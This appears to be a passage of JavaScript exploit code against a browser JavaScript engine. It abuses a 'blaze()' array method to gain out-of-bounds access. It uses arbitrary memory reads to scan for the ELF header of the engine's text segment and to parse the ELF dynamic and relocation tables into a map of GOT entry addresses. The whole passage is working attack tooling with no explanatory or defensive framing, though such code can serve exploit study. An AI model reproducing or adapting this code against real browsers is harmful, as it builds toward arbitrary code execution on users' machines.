function leak_text() {
        var target = new Uint8Array(16);
        var elementsPtr = arb_r8(BigInt(addr_of(target)) + BigInt(8*3));
        elementsPtr = elementsPtr - (elementsPtr % 4096);
        while (1) {
                x = new Array(1.1, 2.2, 3.3, 4.4, 5.5, 6.6);
                y = new Uint8Array(8);
                x.blaze();

                addr = elementsPtr;

                i = new Int64(addr);
                x[13] = i.asDouble();
                value1 = y[0];
                addr += Number(1);

                if (value1 != 0x7f) {
                        elementsPtr -= 4096;
                        continue;
                }

                i = new Int64(addr);
                x[13] = i.asDouble();
                value2 = y[0];
                addr += Number(1);

                if (value2 != 0x45) {
                        elementsPtr -= 4096;
                        continue;
                }

                i = new Int64(addr);
                x[13] = i.asDouble();
                value3 = y[0];
                addr += Number(1);

                if (value3 != 0x4c) {
                        elementsPtr -= 4096;
                        continue;
                }

                i = new Int64(addr);
                x[13] = i.asDouble();
                value4 = y[0];
                addr += Number(1);

                if (value4 != 0x46) {
                        elementsPtr -= 4096;
                        continue;
                }

                return elementsPtr;
        }
}


function ELF64_R_SYM(i) {
	return ((i) >> 32);
}

function ELF64_R_TYPE(i) {
	return ((i) & 0xffffffff);
}

let offsetof_e_phnum = 56;
let offsetof_e_phoff = 32;
let offsetof_p_type = 0;
let offsetof_p_flags = 4;
let offsetof_p_filesz = 32;
let offsetof_p_offset = 8;
let offsetof_p_vaddr = 16;
let offsetof_d_tag = 0;
let offsetof_d_un_d_val = 8;
let offsetof_r_offset = 0;
let offsetof_r_info = 8;
let offsetof_st_name = 0;
let sizeof_Elf64_Phdr = 56;
let sizeof_Elf64_Dyn = 16;
let sizeof_Elf64_Rela = 24;
let sizeof_Elf64_Sym = 24;
let PT_LOAD = 1;
let PT_DYNAMIC = 2;
let PF_W = 2;
let PF_X = 1;
let DT_PLTGOT = 3;
let DT_JMPREL = 23;
let DT_PLTRELSZ = 2;
let DT_SYMTAB = 6;
let DT_STRTAB = 5;
let DT_STRSZ = 10;
let DT_RELAENT = 9;
let R_X86_64_JUMP_SLOT = 7;

function get_got(base_addr) {
	var got = new Array();
	var p_dyn, p_data, p_text;
	var e_phnum;
	var e_phoff;

	e_phnum = arb_r2(base_addr + offsetof_e_phnum);
	e_phoff = arb_r8(base_addr + offsetof_e_phoff);

//	console.log("e_phnum " + e_phnum);
//	console.log("e_phoff " + e_phoff);
	for (var i = 0; i < e_phnum; i++) {
		var offset =  e_phoff + sizeof_Elf64_Phdr * i;
		var p_type = arb_r4(base_addr + offset + offsetof_p_type);
		var p_flags = arb_r4(base_addr + offset + offsetof_p_flags);

		if (p_type == PT_LOAD && (p_flags & PF_X)) {
			p_text = i;
		} else if (p_type == PT_LOAD && (p_flags & PF_W)) {
			p_data = i;
		} else if (p_type == PT_DYNAMIC) {
			p_dyn = i;
		}
	}
//	console.log("p_text " + p_text);
//	console.log("p_data " + p_data);
//	console.log("p_dyn  " + p_dyn);

	var p_dyn_filesz = arb_r8(base_addr + e_phoff + sizeof_Elf64_Phdr * p_dyn + offsetof_p_filesz);
	var p_dyn_offset = arb_r8(base_addr + e_phoff + sizeof_Elf64_Phdr * p_dyn + offsetof_p_offset);
	var p_dyn_vaddr = arb_r8(base_addr + e_phoff + sizeof_Elf64_Phdr * p_dyn + offsetof_p_vaddr);
	var p_text_offset = arb_r8(base_addr + e_phoff + sizeof_Elf64_Phdr * p_text + offsetof_p_offset);
	var p_text_vaddr = arb_r8(base_addr + e_phoff + sizeof_Elf64_Phdr * p_text + offsetof_p_vaddr);
	var p_data_offset = arb_r8(base_addr + e_phoff + sizeof_Elf64_Phdr * p_data + offsetof_p_offset);
	var p_data_vaddr = arb_r8(base_addr + e_phoff + sizeof_Elf64_Phdr * p_data + offsetof_p_vaddr);

//	console.log("p_dyn_filesz " + p_dyn_filesz);
//	console.log("p_dyn_offset " + p_dyn_offset.toString(16));
//	console.log("p_text_offset " + p_text_offset);
//	console.log("p_text_vaddr " + p_text_vaddr);

	var rel, relsz, strtab, symtab, relaent, strsz, pltgot;

	for (var i = 0; i < p_dyn_filesz / sizeof_Elf64_Dyn; i++) {
		var offset =  p_dyn_vaddr + sizeof_Elf64_Dyn * i;
		var d_tag = arb_r8(base_addr + offset + offsetof_d_tag);
		var d_val = arb_r8(base_addr + offset + offsetof_d_un_d_val);

		switch (d_tag) {
		case DT_PLTGOT:
			pltgot = d_val;
			break;
		case DT_JMPREL:
			rel = d_val;
			break;
		case DT_PLTRELSZ:
			relsz = d_val;
			break;
		case DT_SYMTAB:
			symtab = d_val;
			break;
		case DT_STRTAB:
			strtab = d_val;
			break;
		case DT_STRSZ:
			strsz = d_val;
			break;
		case DT_RELAENT:
			relaent = d_val;
			break;
		default:
			break;
		}

	}

//	console.log("pltgot" + pltgot.toString(16));
//	console.log("rel " + rel.toString(16));
//	console.log("relsz " + relsz);
//	console.log("symtab " + symtab.toString(16));
//	console.log("strtab " + strtab.toString(16));
//	console.log("strsz " + strsz);
//	console.log("relaent " + relaent);

	for (var i = 0; i < relsz / sizeof_Elf64_Rela; i++) {
		var offset =  rel + sizeof_Elf64_Rela * i;
		var r_offset = arb_r8(offset + offsetof_r_offset);
		var r_type = arb_r4(offset + offsetof_r_info + 0);
		var r_sym = arb_r4(offset + offsetof_r_info + 4);

//		console.log("r_sym " + r_sym.toString(16));
		if (r_type == R_X86_64_JUMP_SLOT) {
			var sym_offset =  symtab + r_sym * sizeof_Elf64_Sym;
			var st_name = arb_r4(sym_offset + offsetof_st_name);
			var got_address;

			got_address = pltgot + (i+3) *8;
			name = arb_rstring(strtab + st_name);
			got[name] = got_address;
//			console.log(name + " " + got_address.toString(16));
		}
	}
	return got;
}
